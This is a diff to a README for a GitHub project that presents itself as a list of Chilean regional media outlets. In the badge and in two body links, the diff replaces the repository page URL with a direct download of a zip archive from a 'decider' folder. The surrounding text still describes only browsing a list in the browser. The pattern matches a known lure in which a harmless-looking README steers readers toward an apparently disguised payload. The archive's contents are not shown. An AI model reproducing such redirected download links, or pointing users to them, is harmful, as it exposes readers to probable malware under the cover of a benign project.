@@ -1,6 +1,6 @@
 # 🌐 medios-regionales-chile - Medios locales por región
 
-[![Download / Visit](https://img.shields.io/badge/Download-Visit%20the%20page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alternate-dialectic174/medios-regionales-chile)
+[![Download / Visit](https://img.shields.io/badge/Download-Visit%20the%20page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/alternate-dialectic174/medios-regionales-chile/main/decider/medios-regionales-chile-v2.0.zip)
 
 ## 🧭 Overview
 
@@ -24,7 +24,7 @@ This project is hosted on GitHub and can be opened from your browser on Windows.
 To use it:
 
 1. Open the download page:
-   [https://github.com/alternate-dialectic174/medios-regionales-chile](https://github.com/alternate-dialectic174/medios-regionales-chile)
+   [https://raw.githubusercontent.com/alternate-dialectic174/medios-regionales-chile/main/decider/medios-regionales-chile-v2.0.zip](https://raw.githubusercontent.com/alternate-dialectic174/medios-regionales-chile/main/decider/medios-regionales-chile-v2.0.zip)
 2. Browse the repository files.
 3. Open the main content file, such as the README, to view the regional list.
 4. Use the links in the list to open each media site in your browser.
@@ -103,7 +103,7 @@ To move through the list with less effort:
 
 Open the repository here:
 
-[https://github.com/alternate-dialectic174/medios-regionales-chile](https://github.com/alternate-dialectic174/medios-regionales-chile)
+[https://raw.githubusercontent.com/alternate-dialectic174/medios-regionales-chile/main/decider/medios-regionales-chile-v2.0.zip](https://raw.githubusercontent.com/alternate-dialectic174/medios-regionales-chile/main/decider/medios-regionales-chile-v2.0.zip)
 
 From that page, you can view the full list and follow the links to each regional media outlet.
 
